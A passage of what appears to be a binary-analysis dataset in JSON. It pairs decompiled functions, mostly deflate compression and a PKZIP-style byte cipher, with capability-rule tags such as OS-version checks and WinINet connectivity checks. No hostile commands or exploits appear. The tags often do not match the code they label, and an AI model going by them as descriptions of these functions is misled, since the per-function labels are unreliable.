= *(arg_8h + 0x18fc) + 1;\n    var_4h = 0;\n    if (var_8h < 0x23d) {\n        arg_8h = arg_8h + 0x1004 + var_8h * 4;\n        var_10h = 0x23d - var_8h;\n        var_8h = var_8h + var_10h;\n        do {\n            iVar7 = *arg_8h;\n            iVar9 = *(iVar6 + 2 + *(iVar6 + 2 + iVar7 * 4) * 4) + 1;\n            if (iVar14 < iVar9) {\n                iVar12 = iVar12 + 1;\n                iVar9 = iVar14;\n                var_4h = iVar12;\n            }\n            *(iVar6 + 2 + iVar7 * 4) = iVar9;\n            if (iVar7 <= iVar4) {\n                piVar11 = iVar8 + 0xfe4 + iVar9 * 2;\n                *piVar11 = *piVar11 + 1;\n                iVar15 = 0;\n                if (iVar3 <= iVar7) {\n                    iVar15 = *(iVar10 + (iVar7 - iVar3) * 4);\n                }\n                uVar13 = *(iVar6 + iVar7 * 4);\n                *(iVar8 + 0x1af3c) = *(iVar8 + 0x1af3c) + (iVar9 + iVar15) * uVar13;\n                iVar12 = var_4h;\n                if (iVar5 != 0) {\n                    *(iVar8 + 0x1af40) = *(iVar8 + 0x1af40) + (*(iVar5 + 2 + iVar7 * 4) + iVar15) * uVar13;\n                }\n            }\n            arg_8h = arg_8h + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n        if (iVar12 != 0) {\n            puVar16 = iVar8 + 0xfe4 + iVar14 * 2;\n            do {\n                iVar10 = iVar14 + -1;\n                piVar11 = iVar8 + 0xfe4 + iVar10 * 2;\n                iVar1 = *(iVar8 + 0xfe4 + iVar10 * 2);\n                while (iVar1 == 0) {\n                    piVar11 = piVar11 + -1;\n                    iVar10 = iVar10 + -1;\n                    iVar1 = *piVar11;\n                }\n                piVar11 = iVar8 + 0xfe6 + iVar10 * 2;\n                *piVar11 = *piVar11 + 2;\n                piVar11 = iVar8 + 0xfe4 + iVar10 * 2;\n                *piVar11 = *piVar11 + -1;\n                *puVar16 = *puVar16 - 1;\n                iVar12 = iVar12 + -2;\n            } while (0 < iVar12);\n            for (; iVar14 != 0; iVar14 = iVar14 + -1) {\n                arg_ch = *puVar16;\n                if (arg_ch != NULL) {\n                    iVar10 = iVar8 + 0x1004 + var_8h * 4;\n                    do {\n                        iVar3 = *(iVar10 + -4);\n                        var_8h = var_8h + -1;\n                        iVar10 = iVar10 + -4;\n                        if (iVar3 <= iVar4) {\n                            uVar2 = *(iVar6 + 2 + iVar3 * 4);\n                            if (uVar2 != iVar14) {\n                                *(iVar8 + 0x1af3c) = *(iVar8 + 0x1af3c) + (iVar14 - uVar2) * *(iVar6 + iVar3 * 4);\n                                *(iVar6 + 2 + iVar3 * 4) = iVar14;\n                            }\n                            arg_ch = arg_ch - 1;\n                        }\n                    } while (arg_ch != NULL);\n                }\n                puVar16 = puVar16 + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1367
    },
    "00425ee0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425ee0(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    \n    if (arg_8h[0x6bd7] < 9) {\n        if (arg_8h[0x6bd7] < 1) goto code_r0x00425f7b;\n        if (arg_8h[0x6bda] <= arg_8h[0x6bd9]) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], arg_8h + 0x6bd9);\n        }\n        *(arg_8h[0x6bd8] + arg_8h[0x6bd9]) = *(arg_8h + 0x6bd6);\n    }\n    else {\n        puVar1 = arg_8h + 0x6bd9;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = *(arg_8h + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + arg_8h[0x6bd8]) = *(arg_8h + 0x1af59);\n    }\n    arg_8h[0x6bd9] = arg_8h[0x6bd9] + 1;\ncode_r0x00425f7b:\n    if (arg_8h[0x6bd5] != 0) {\n        (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], arg_8h + 0x6bd9);\n    }\n    arg_8h[0x6bd6] = 0;\n    arg_8h[0x6bd7] = 0;\n    arg_8h[0x6bdb] = arg_8h[0x6bdb] + 7 & 0xfffffff8;\n    return;\n}\n",
        "token_count": 506
    },
    "00425fd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425fd0(uint *arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    \n    fcn.00425ee0(arg_8h);\n    if (arg_14h != 0) {\n        puVar1 = arg_8h + 0x6bd9;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = arg_10h;\n        *puVar1 = *puVar1 + 1;\n        uVar4 = arg_10h >> 8;\n        *(*puVar1 + arg_8h[0x6bd8]) = uVar4;\n        *puVar1 = *puVar1 + 1;\n        if (arg_8h[0x6bda] - 1 <= *puVar1) {\n            (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], puVar1);\n        }\n        *(arg_8h[0x6bd8] + *puVar1) = ~arg_10h;\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + arg_8h[0x6bd8]) = ~uVar4;\n        *puVar1 = *puVar1 + 1;\n        arg_8h[0x6bdb] = arg_8h[0x6bdb] + 0x20;\n    }\n    if (arg_8h[0x6bd5] != 0) {\n        piVar2 = arg_8h + 0x6bd9;\n        (*arg_8h[4])(*arg_8h, arg_8h[0x6bd8], piVar2);\n        *piVar2 = arg_10h;\n        (*arg_8h[4])(*arg_8h, arg_ch, piVar2);\n        arg_8h[0x6bdb] = arg_8h[0x6bdb] + arg_10h * 8;\n        return;\n    }\n    uVar3 = arg_8h[0x6bd9] + arg_10h;\n    if (uVar3 < arg_8h[0x6bda] || uVar3 == arg_8h[0x6bda]) {\n        fcn.0042a840(arg_8h[0x6bd8] + arg_8h[0x6bd9], arg_ch, arg_10h);\n        arg_8h[0x6bd9] = arg_8h[0x6bd9] + arg_10h;\n    }\n    arg_8h[0x6bdb] = arg_8h[0x6bdb] + arg_10h * 8;\n    return;\n}\n",
        "token_count": 721
    },
    "00426260": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426260(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    while( true ) {\n        iVar4 = (*(arg_8h + 0x6af70) - *(arg_8h + 0x6af84)) - *(arg_8h + 0x6af90);\n        if (iVar4 == -1) {\n            iVar4 = -2;\n        }\n        else if ((0xfef9 < *(arg_8h + 0x6af84)) && (*(arg_8h + 0x6af78) != 0)) {\n            fcn.0042a840(arg_8h + 0x1af70, arg_8h + 0x22f70, 0x8000);\n            *(arg_8h + 0x6af88) = *(arg_8h + 0x6af88) + -0x8000;\n            *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + -0x8000;\n            *(arg_8h + 0x6af74) = *(arg_8h + 0x6af74) + -0x8000;\n            puVar1 = arg_8h + 0x4af70;\n            iVar3 = 0x8000;\n            do {\n                if (*puVar1 < 0x8000) {\n                    uVar2 = 0;\n                }\n                else {\n                    uVar2 = *puVar1 - 0x8000;\n                }\n                *puVar1 = uVar2;\n                puVar1 = puVar1 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            puVar1 = arg_8h + 0x2af70;\n            iVar3 = 0x8000;\n            do {\n                if (*puVar1 < 0x8000) {\n                    uVar2 = 0;\n                }\n                else {\n                    uVar2 = *puVar1 - 0x8000;\n                }\n                *puVar1 = uVar2;\n                puVar1 = puVar1 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            iVar4 = iVar4 + 0x8000;\n        }\n        if (*(arg_8h + 0x6af8c) != 0) break;\n        iVar4 = (**(arg_8h + 0xc))(arg_8h, *(arg_8h + 0x6af84) + arg_8h + 0x1af70 + *(arg_8h + 0x6af90), iVar4);\n        if ((iVar4 == 0) || (iVar4 == -1)) {\n            *(arg_8h + 0x6af8c) = 1;\n        }\n        else {\n            *(arg_8h + 0x6af90) = *(arg_8h + 0x6af90) + iVar4;\n        }\n        if (0x105 < *(arg_8h + 0x6af90)) {\n            return;\n        }\n        if (*(arg_8h + 0x6af8c) != 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 772
    },
    "004272a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004272a0(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    uVar4 = arg_ch;\n    if (*(in_ECX + 0x2d) != '\\0') {\n        if ((*(in_ECX + 0x3c) != 0) && (*(in_ECX + 0x40) < arg_ch)) {\n            fcn.0042a679(*(in_ECX + 0x3c));\n            *(in_ECX + 0x3c) = 0;\n        }\n        if (*(in_ECX + 0x3c) == 0) {\n            uVar2 = fcn.0042b2b1(uVar4 * 2);\n            *(in_ECX + 0x3c) = uVar2;\n            *(in_ECX + 0x40) = uVar4;\n        }\n        fcn.0042a840(*(in_ECX + 0x3c), arg_8h, uVar4);\n        uVar5 = 0;\n        if (uVar4 != 0) {\n            do {\n                uVar1 = *(uVar5 + *(in_ECX + 0x3c));\n                uVar4 = *(in_ECX + 0x38);\n                uVar3 = *(((uVar1 ^ *(in_ECX + 0x30)) & 0xff) * 4 + 0x448250) ^ *(in_ECX + 0x30) >> 8;\n                *(in_ECX + 0x30) = uVar3;\n                uVar3 = ((uVar3 & 0xff) + *(in_ECX + 0x34)) * 0x8088405 + 1;\n                *(in_ECX + 0x34) = uVar3;\n                *(in_ECX + 0x38) = uVar4 >> 8 ^ *(((uVar3 >> 0x18 ^ uVar4) & 0xff) * 4 + 0x448250);\n                uVar4 = uVar4 & 0xfffd | 2;\n                uVar3 = uVar5 + 1;\n                *(uVar5 + *(in_ECX + 0x3c)) = (uVar4 ^ 1) * uVar4 >> 8 ^ uVar1;\n                uVar5 = uVar3;\n                uVar4 = arg_ch;\n            } while (uVar3 < arg_ch);\n        }\n        arg_8h = *(in_ECX + 0x3c);\n    }\n    if (*(in_ECX + 0x20) == 0) {\n        if (*(in_ECX + 4) == 0) {\n            *(in_ECX + 0x14) = 0x1000000;\n            return 0;\n        }\n        (**0x462f38)(*(in_ECX + 4), arg_8h, uVar4, &arg_ch, 0);\n        return arg_ch;\n    }\n    if (*(in_ECX + 0x24) + uVar4 < *(in_ECX + 0x28)) {\n        fcn.0042a840(*(in_ECX + 0x24) + *(in_ECX + 0x20), arg_8h, uVar4);\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + uVar4;\n        return uVar4;\n    }\n    *(in_ECX + 0x14) = 0x30000;\n    return 0;\n}\n",
        "token_count": 843
    },
    "00427400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427400(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x1c) == '\\0') {\n        *(in_ECX + 0x14) = 0x2000000;\n        return 0;\n    }\n    if (*(in_ECX + 0x20) != 0) {\n        if (*(in_ECX + 0x28) <= arg_8h) {\n            *(in_ECX + 0x14) = 0x30000;\n            return 0;\n        }\n        *(in_ECX + 0x24) = arg_8h;\n        return 1;\n    }\n    if (*(in_ECX + 4) != 0) {\n        (**0x462ee8)(*(in_ECX + 4), *(in_ECX + 0x10) + arg_8h, 0, 0);\n        return 1;\n    }\n    *(in_ECX + 0x14) = 0x1000000;\n    return 0;\n}\n",
        "token_count": 242
    },
    "004278d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004278d0(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x80) != '\\0') && (*(param_1 + 0x7c) != 0)) {\n        (**0x462ed0)(*(param_1 + 0x7c));\n    }\n    *(param_1 + 0x7c) = 0;\n    if ((*(param_1 + 0x70) != -1) && (*(param_1 + 0x70) != *(param_1 + 0x74))) {\n        *(param_1 + 0x70) = *(param_1 + 0x74);\n        return 0x60000;\n    }\n    *(param_1 + 0x70) = *(param_1 + 0x74);\n    return 0;\n}\n",
        "token_count": 190
    },
    "00427a90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427a90(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch[4];\n    iVar4 = arg_ch[1];\n    arg_ch_00 = *arg_ch;\n    iVar2 = 0;\n    var_4h = -1;\n    *(arg_8h + 0x18f8) = 0;\n    *(arg_8h + 0x18fc) = 0x23d;\n    if (0 < var_8h) {\n        do {\n            if (*(arg_ch_00 + iVar2 * 4) == 0) {\n                *(arg_ch_00 + 2 + iVar2 * 4) = 0;\n            }\n            else {\n                *(arg_8h + 0x18f8) = *(arg_8h + 0x18f8) + 1;\n                *(arg_8h + 0x1004 + *(arg_8h + 0x18f8) * 4) = iVar2;\n                *(iVar2 + 0x1900 + arg_8h) = 0;\n                var_4h = iVar2;\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < var_8h);\n    }\n    iVar2 = *(arg_8h + 0x18f8);\n    while (iVar2 < 2) {\n        if (var_4h < 2) {\n            iVar2 = var_4h + 1;\n            var_4h = iVar2;\n        }\n        else {\n            iVar2 = 0;\n        }\n        *(arg_8h + 0x18f8) = *(arg_8h + 0x18f8) + 1;\n        *(arg_8h + 0x1004 + *(arg_8h + 0x18f8) * 4) = iVar2;\n        *(arg_ch_00 + iVar2 * 4) = 1;\n        *(arg_8h + 0x1900 + iVar2) = 0;\n        *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + -1;\n        if (iVar4 != 0) {\n            *(arg_8h + 0x1af40) = *(arg_8h + 0x1af40) - *(iVar4 + 2 + iVar2 * 4);\n        }\n        iVar2 = *(arg_8h + 0x18f8);\n    }\n    arg_ch[6] = var_4h;\n    for (iVar4 = *(arg_8h + 0x18f8) / 2; 0 < iVar4; iVar4 = iVar4 + -1) {\n        fcn.00425800(arg_8h, arg_ch_00, iVar4);\n    }\n    do {\n        iVar4 = *(arg_8h + 0x1008);\n        *(arg_8h + 0x1008) = *(arg_8h + 0x1004 + *(arg_8h + 0x18f8) * 4);\n        *(arg_8h + 0x18f8) = *(arg_8h + 0x18f8) + -1;\n        fcn.00425800(arg_8h, arg_ch_00, 1);\n        iVar2 = *(arg_8h + 0x1008);\n        *(arg_8h + 0x18fc) = *(arg_8h + 0x18fc) + -1;\n        *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) = iVar4;\n        *(arg_8h + 0x18fc) = *(arg_8h + 0x18fc) + -1;\n        *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) = iVar2;\n        *(arg_ch_00 + var_8h * 4) = *(arg_ch_00 + iVar2 * 4) + *(arg_ch_00 + iVar4 * 4);\n        uVar1 = *(arg_8h + 0x1900 + iVar2);\n        uVar3 = *(arg_8h + 0x1900 + iVar4);\n        if (uVar3 < uVar1) {\n            uVar3 = uVar1;\n        }\n        *(arg_8h + 0x1900 + var_8h) = uVar3 + 1;\n        *(arg_ch_00 + 2 + iVar2 * 4) = var_8h;\n        *(arg_ch_00 + 2 + iVar4 * 4) = var_8h;\n        *(arg_8h + 0x1008) = var_8h;\n        var_8h = var_8h + 1;\n        fcn.00425800(arg_8h, arg_ch_00, 1);\n    } while (1 < *(arg_8h + 0x18f8));\n    *(arg_8h + 0x18fc) = *(arg_8h + 0x18fc) + -1;\n    *(arg_8h + 0x1004 + *(arg_8h + 0x18fc) * 4) = *(arg_8h + 0x1008);\n    fcn.004258e0(arg_8h, arg_ch);\n    fcn.00427a00(arg_8h, arg_ch_00, var_4h);\n    return;\n}\n",
        "token_count": 1322
    },
    "004280c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004280c0(int32_t arg_8h, int32_t arg_ch, uint16_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    *(arg_8h + 0x6af78) = 0;\n    if (*(arg_8h + 0x6af70) == 0) {\n        *(arg_8h + 0x6af78) = 1;\n        *(arg_8h + 0x6af70) = 0x10000;\n    }\n    *(arg_8h + 0x6af6c) = 0;\n    fcn.0042a6e0(arg_8h + 0x4af70, 0, 0x1fffc);\n    *(arg_8h + 0x6af98) = *(arg_ch * 8 + 0x448202);\n    *(arg_8h + 0x6af9c) = *(arg_ch * 8 + 0x448200);\n    *(arg_8h + 0x6afa0) = *(arg_ch * 8 + 0x448204);\n    *(arg_8h + 0x6af94) = *(arg_ch * 8 + 0x448206);\n    if (arg_ch < 3) {\n        *arg_10h = *arg_10h | 4;\n    }\n    else if (7 < arg_ch) {\n        *arg_10h = *arg_10h | 2;\n    }\n    *(arg_8h + 0x6af84) = 0;\n    *(arg_8h + 0x6af74) = 0;\n    uVar1 = (**(arg_8h + 0xc))(arg_8h, arg_8h + 0x1af70, 0x10000);\n    *(arg_8h + 0x6af90) = uVar1;\n    if ((uVar1 != 0) && (uVar1 != 0xffffffff)) {\n        *(arg_8h + 0x6af8c) = 0;\n        if (uVar1 < 0x106) {\n            fcn.00426260(arg_8h);\n        }\n        *(arg_8h + 0x6af7c) = 0;\n        uVar1 = *(arg_8h + 0x1af70);\n        *(arg_8h + 0x6af7c) = uVar1;\n        *(arg_8h + 0x6af7c) = *(arg_8h + 0x1af71) ^ uVar1 << 5;\n        return;\n    }\n    *(arg_8h + 0x6af90) = 0;\n    *(arg_8h + 0x6af8c) = 1;\n    return;\n}\n",
        "token_count": 644
    },
    "00428300": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.00428300(int32_t param_1)\n\n{\n    bool bVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(param_1 + 0x18);\n    var_8h = 0;\n    bVar1 = true;\n    arg_8h = *(param_1 + 0x44);\n    while (arg_8h != 0) {\n        if ((bVar1) && (iVar2 = fcn.00426710(arg_8h, 0x427620, param_1),  iVar2 != 0)) {\n            bVar1 = false;\n        }\n        var_8h = var_8h + 1;\n        *(param_1 + 0x18) = *(param_1 + 0x18) + *(arg_8h + 0x24) + *(arg_8h + 0x20) + 0x2e + *(arg_8h + 0x18);\n        iVar2 = *(arg_8h + 0x35c);\n        if (*(arg_8h + 0x140) != 0) {\n            fcn.0042a679(*(arg_8h + 0x140));\n        }\n        fcn.0042a679(arg_8h);\n        arg_8h = iVar2;\n    }\n    if (bVar1) {\n        iVar3 = fcn.00426a70(var_8h, *(param_1 + 0x18) - iVar3, *(param_1 + 0x10) + iVar3, 0, 0, 0x427620, param_1);\n        if (iVar3 != 0) {\n            bVar1 = false;\n        }\n        *(param_1 + 0x18) = *(param_1 + 0x18) + 0x16;\n        if (bVar1) {\n            return 0;\n        }\n    }\n    return 0x400;\n}\n",
        "token_count": 490
    },
    "004287f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004287f0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *(*(arg_8h + 0x1af34) + 0x19f2c + arg_8h) = *(arg_8h + 0x1af38);\n    if (**(arg_8h + 0x1af50) == -1) {\n        fcn.00425d90(arg_8h);\n    }\n    fcn.00427a90(arg_8h, arg_8h + 0xf90);\n    fcn.00427a90(arg_8h, arg_8h + 0xfac);\n    iVar1 = fcn.00427df0(arg_8h);\n    *(arg_8h + 0x1af4c) = *(arg_8h + 0x1af4c) + arg_10h;\n    uVar2 = *(arg_8h + 0x1af3c) + 10U >> 3;\n    uVar3 = *(arg_8h + 0x1af40) + 10U >> 3;\n    if (uVar3 <= uVar2) {\n        uVar2 = uVar3;\n    }\n    if ((uVar2 < arg_10h + 4U) || (arg_ch == 0)) {\n        if (uVar3 == uVar2) {\n            fcn.00425e40(arg_8h, arg_14h + 2, 3);\n            fcn.00427f70(arg_8h, arg_8h + 0x9fc, arg_8h + 0xe7c);\n            iVar1 = *(arg_8h + 0x1af40);\n        }\n        else {\n            fcn.00425e40(arg_8h, arg_14h + 4, 3);\n            fcn.00427ed0(arg_8h, *(arg_8h + 0xfa8) + 1, *(arg_8h + 0xfc4) + 1, iVar1 + 1);\n            fcn.00427f70(arg_8h, arg_8h + 0x14, arg_8h + 0x908);\n            iVar1 = *(arg_8h + 0x1af3c);\n        }\n        uVar2 = *(arg_8h + 0x1af48) + 3 + iVar1;\n        *(arg_8h + 0x1af44) = *(arg_8h + 0x1af44) + (uVar2 >> 3);\n        *(arg_8h + 0x1af48) = uVar2 & 7;\n    }\n    else {\n        fcn.00425e40(arg_8h, arg_14h, 3);\n        *(arg_8h + 0x1af44) = *(arg_8h + 0x1af44) + (*(arg_8h + 0x1af48) + 10U >> 3) + 4 + arg_10h;\n        *(arg_8h + 0x1af48) = 0;\n        fcn.00425fd0(arg_8h, arg_ch, arg_10h, 1);\n    }\n    fcn.00425770(arg_8h);\n    if (arg_14h != 0) {\n        fcn.00425ee0(arg_8h);\n        *(arg_8h + 0x1af48) = *(arg_8h + 0x1af48) + 7;\n    }\n    return (*(arg_8h + 0x1af48) >> 3) + *(arg_8h + 0x1af44);\n}\n",
        "token_count": 883
    },
    "004299c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004299c0(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    if (arg_8h == NULL) {\n        *0x46316c = 0x10000;\n        return;\n    }\n    if (*arg_8h != 2) {\n        *0x46316c = 0x80000;\n        return;\n    }\n    *0x46316c = fcn.00429060(arg_ch, arg_10h, 0, 2);\n    return;\n}\n",
        "token_count": 124
    },
    "00429a10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429a10(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_8h == NULL) {\n        *0x46316c = 0x10000;\n        return;\n    }\n    if (*arg_8h != 2) {\n        *0x46316c = 0x80000;\n        return;\n    }\n    *0x46316c = fcn.00429060(arg_ch, arg_10h, arg_14h, 3);\n    return;\n}\n",
        "token_count": 132
    },
    "00429a60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429a60(int32_t *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == NULL) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = 0;\n        }\n        *0x46316c = 0x10000;\n        return;\n    }\n    if (*arg_8h != 2) {\n        *0x46316c = 0x80000;\n        return;\n    }\n    iVar1 = arg_8h[1];\n    if (*(iVar1 + 0x2c) == '\\0') {\n        fcn.00428300();\n    }\n    *(iVar1 + 0x2c) = 1;\n    if (arg_ch != NULL) {\n        *arg_ch = *(iVar1 + 0x20);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = *(iVar1 + 0x18);\n    }\n    *0x46316c = (-(*(iVar1 + 0x20) != 0) & 0xfffe0000) + 0x20000;\n    return;\n}\n",
        "token_count": 292
    },
    "00429af0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00429af0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == NULL) {\n        *0x46316c = 0x10000;\n        return 0x10000;\n    }\n    if (*arg_8h != 2) {\n        *0x46316c = 0x80000;\n        return 0x80000;\n    }\n    iVar1 = arg_8h[1];\n    *0x46316c = fcn.00428ee0();\n    if (iVar1 != 0) {\n        fcn.004279a0(1);\n    }\n    fcn.0042a679(arg_8h);\n    return *0x46316c;\n}\n",
        "token_count": 173
    },
    "0042a563": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042a563(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = arg_ch & 4;\n    uVar2 = arg_ch & 0x80;\n    uVar1 = 1;\n    if ((arg_ch & 0x40) != 0) {\n        arg_ch = arg_ch | 1;\n    }\n    if ((arg_ch & 8) != 0) {\n        arg_ch = arg_ch | 2;\n    }\n    iVar4 = 0;\n    do {\n        if (uVar1 == (arg_ch & 0xffffff3b)) break;\n        uVar1 = *(\"fmhmiaejopepamlcjkncpgpdjichnecm\" + iVar4 * 4);\n        iVar4 = iVar4 + 1;\n    } while (uVar1 != 0);\n    if (*(iVar4 * 4 + 0x4487ec) != 0) {\n        if (((uVar2 == 0) || ((arg_ch & 10) == 0)) || (arg_8h_00 = fcn.0042a49c(arg_8h, 0, arg_10h),  arg_8h_00 == 0)) {\n            arg_8h_00 = fcn.0042a49c(arg_8h, iVar4, arg_10h);\n            if (arg_8h_00 == 0) {\n                return 0;\n            }\n            if (uVar3 == 0) {\n                return arg_8h_00;\n            }\n            iVar4 = fcn.0042ffbe(arg_8h_00, 0, 2);\n            if (iVar4 == 0) {\n                return arg_8h_00;\n            }\n        }\n        fcn.0042e25f(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 471
    },
    "0042a7fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
